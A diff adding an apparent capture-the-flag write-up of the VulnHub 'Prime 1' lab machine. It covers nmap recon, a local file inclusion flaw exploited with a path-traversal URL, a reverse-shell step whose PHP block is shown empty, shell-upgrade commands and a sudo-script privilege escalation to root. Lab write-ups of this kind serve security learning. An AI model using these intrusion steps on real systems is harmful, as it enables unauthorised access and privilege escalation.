@@ -1,0 +1,272 @@
+<div id="content"><hr />
+
+<p>tags: [VulnHub]<br />
+title: Prime 1<br />
+created: '2021-01-16T09:29:23.603Z'</p>
+
+<h2 id="modified-2021-01-20t145244736z">modified: '2021-01-20T14:52:44.736Z'</h2>
+
+<h1 id="prime-1">Prime 1</h1>
+
+<h2 id="nmap">NMAP</h2>
+
+<pre><code class="bash lang-bash language-bash"># Nmap 7.91 scan initiated Wed Dec 23 10:42:05 2020 as: nmap -p- -A -sV -oN nmap.txt 192.168.1.107
+Nmap scan report for ubuntu.broadband (192.168.1.107)
+Host is up (0.00069s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
+|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
+|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: HacknPentest
+MAC Address: 00:0C:29:3A:4F:C3 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.69 ms ubuntu.broadband (192.168.1.107)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Dec 23 10:42:20 2020 -- 1 IP address (1 host up) scanned in 16.03 seconds
+</code></pre>
+
+<h2 id="webserver">Webserver</h2>
+
+<ul>
+<li>image.php has lfi<br />
+<img src="screenshot-2021-01-26-at-095032png" alt="Screenshot 2021-01-26 at 09.50.32.png" /></li>
+<li>We knew this as we fuzzed the initial web page which gave. us hints along the way to fuzz all php pages to find some sort of parameter </li>
+<li>From there we found another file saying to use "secrettier360" as a new parameter</li>
+<li>I fuzzed this and it dropped all the pages on the website as a para,eter so i knew it was including files from th!e webserver which meant it was vulnerable to LFI<br />
+<img src="screenshot-2021-01-26-at-095402png" alt="Screenshot 2021-01-26 at 09.54.02.png" /></li>
+<li>It is including the page inside the page (very weird/ sus)</li>
+<li>We can FUZZ the LFI to look for files on the webserver</li>
+</ul>
+
+<p>/home/saket/password.txt</p>
+
+<blockquote>
+  <p>follow_the_ippsec</p>
+</blockquote>
+
+<h2 id="foothold-on-network">Foothold on network</h2>
+
+<ul>
+<li>log in to wordpress with victor and password found earlier</li>
+<li>No where has write permissions except secret.php in the theme "twentynineteen"</li>
+<li>paste reverse shell</li>
+</ul>
+
+<pre><code class="php lang-php language-php"><?php
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+
+?> 
+</code></pre>
+
+<ul>
+<li>Need to find where secret.php is stored so we can run it</li>
+</ul>
+
+<pre><code class="bash lang-bash language-bash">http://192.168.16.138/image.php?secrettier360=../../../../../../var/www/html/wordpress/wp-content/themes/twentynineteen/secret.php</code></pre>
+
+<ul>
+<li>Use LFI to run the script</li>
+<li>nc listener catches shell<br />
+<h3 id="upgrade-shell">Upgrade shell</h3></li>
+</ul>
+
+<pre><code class="bash lang-bash language-bash">On victim
+python-c "import pty;pty.spawn('/bin/bash')"</code></pre>
+
+<pre><code class="bash lang-bash language-bash">On Victim
+^z</code></pre>
+
+<pre><code class="bash lang-bash language-bash">On host
+stty -a (find rows and collumns)
+stty raw -echo
+fg
+Enter
+Enter</code></pre>
+
+<pre><code class="bash lang-bash language-bash">On Victim
+export TERM=xterm
+stty rows 38 columns 116</code></pre>
+
+<h2 id="prviledge-escalation">Prviledge Escalation</h2>
+
+<ul>
+<li>Check the classic areas like sudo -l</li>
+<li>Also ran linpeas which showed login to mysql with default root creds<br />
+<ul><br />
+<li>Nothing there</li><br />
+</ul></li>
+<li>Linpeas showed the sudo privileges for the sudo -l so i knew this was the intended way</li>
+<li>The box was running Ubuntu 16.04 which is also vulnerable to a kernel privilege escalation exploit but thats not the intended way.</li>
+</ul>
+
+<h3 id="intended-way">Intended way</h3>
+
+<ul>
+<li>enc?</li>
+<li>GTFObins - basenc? </li>
+<li>Maybe enc binary has reference to basenc which we have sudo priviledges too. </li>
+<li>Base64 encode and then decode a file, which is left with root priviledges</li>
+<li>man enc shows its its own binary<br />
+<ul><br />
+<li>openssl encryption thing</li><br />
+<li>similar to basenc </li><br />
+</ul></li>
+</ul>
+
+<pre><code class="bash lang-bash language-bash">www-data@ubuntu:/home/saket$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (root) NOPASSWD: /home/saket/enc
+www-data@ubuntu:/home/saket$ sudo /home/saket/enc
+enter password: test                                         
+www-data@ubuntu:/home/saket$ cat /tmp/test
+#!/bin/bash
+
+/bin/bash
+www-data@ubuntu:/home/saket$ sudo /home/saket/enc -base64 /tmp/test | enc -d
+
+[1]+  Stopped                 sudo /home/saket/enc -base64 /tmp/test | enc -d
+www-data@ubuntu:/home/saket$ No command 'enc' found, did you mean:
+ Command 'ecc' from package 'ecere-dev' (universe)
+ Command 'nc' from package 'netcat-openbsd' (main)
+ Command 'nc' from package 'netcat-traditional' (universe)
+ Command 'env' from package 'coreutils' (main)
+ Command 'enca' from package 'enca' (universe)
+ Command 'ent' from package 'ent' (universe)
+ Command 'inc' from package 'nmh' (universe)
+ Command 'inc' from package 'mailutils-mh' (universe)
+ Command 'eenc' from package 'refdb-clients' (universe)
+ Command 'znc' from package 'znc' (universe)
+enc: command not found
+
+www-data@ubuntu:/home/saket$ sudo /home/saket/enc -base64 /tmp/test | /home/saket/enc -d
+enter password: test
+
+# didnt find anything so time for some more looking around
+
+</code></pre>
+
+<h3 id="more-recon">More recon:</h3>
+
+<ul>
+<li>Use a simple find command to search for any creds</li>
+</ul>
+
+<pre><code class="bash lang-bash language-bash">www-data@ubuntu:/home/saket$ find . / -name backup 2>/dev/null
+/opt/backup  
+www-data@ubuntu:/home/saket$ cat /opt/backup/server_database/backup_pass 
+your password for backup_database file enc is 
+
+"backup_password"
+
+
+Enjoy!
+www-data@ubuntu:/home/saket$ /home/saket/enc     
+enter password: backup_password
+good
+/bin/cp: cannot stat '/root/enc.txt': Permission denied
+/bin/cp: cannot stat '/root/key.txt': Permission denied
+www-data@ubuntu:/home/saket$ sudo /home/saket/enc
+enter password: backup_password
+good
+www-data@ubuntu:/home/saket$ ls
+enc  enc.txt  key.txt  password.txt  user.txt
+www-data@ubuntu:/home/saket$ 
+</code></pre>
+
+<ul>
+<li>/opt/backup/backup_password</li>
+</ul>
+
+<h4 id="what-we-now-know">What we now know</h4>
+
+<ul>
+<li>Enc copies two files to our home directoy<br />
+&gt; enc.txt and key.txt</li>
+</ul>
+
+<pre><code class="bash lang-bash language-bash">enc.txt
+
+nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
+</code></pre>
+
+<p>enc &gt;&gt; encoded with base 64 and encrypted using AES (probably)</p>
+
+<pre><code class="bash lang-bash language-bash">Key.txt
+
+I know you are the fan of ippsec.
+
+So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.</code></pre>
+
+<p>what the fuck? </p>
+
+<p>MD5 of "ippsec"</p>
+
+<blockquote>
+  <p>366a74cb3c959de17d61db30591c39d1</p>
+</blockquote>
+
+<p>We have an encrypted text using AES ECB encryption</p>
+
+<blockquote>
+  <p>md5 hash is our key for decryption</p>
+</blockquote>
+
+<p>Decrypting gives us:</p>
+
+<pre><code class="plaintext lang-plaintext language-plaintext">RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw=
+</code></pre>
+
+<p>Decode the base64</p>
+
+<pre><code class="bash lang-bash language-bash">Dont worry saket one day we will reach to
+our destination very soon. And if you forget 
+your username then use your old password
+==> "tribute_to_ippsec"
+
+Victor,</code></pre>
+
+<p>we have sakets password</p>
+
+<p>We have sudo privileges to run a file that doesn't exist called "challenge"  that should bein. the /tmp/ directory.</p>
+
+<p>I created my own script that runs /bin/bash. Since it runs as sudo this will give us root.</p>
+
+<pre><code class="bash lang-bash language-bash">saket@ubuntu:~$ sudo -l
+Matching Defaults entries for saket on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User saket may run the following commands on ubuntu:
+    (root) NOPASSWD: /home/victor/undefeated_victor
+saket@ubuntu:~$ sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
+saket@ubuntu:~$ cat /tmp/challenge 
+#!/bin/bash
+
+/bin/bash
+
+saket@ubuntu:~$ sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~# 
+</code></pre>
+</div>
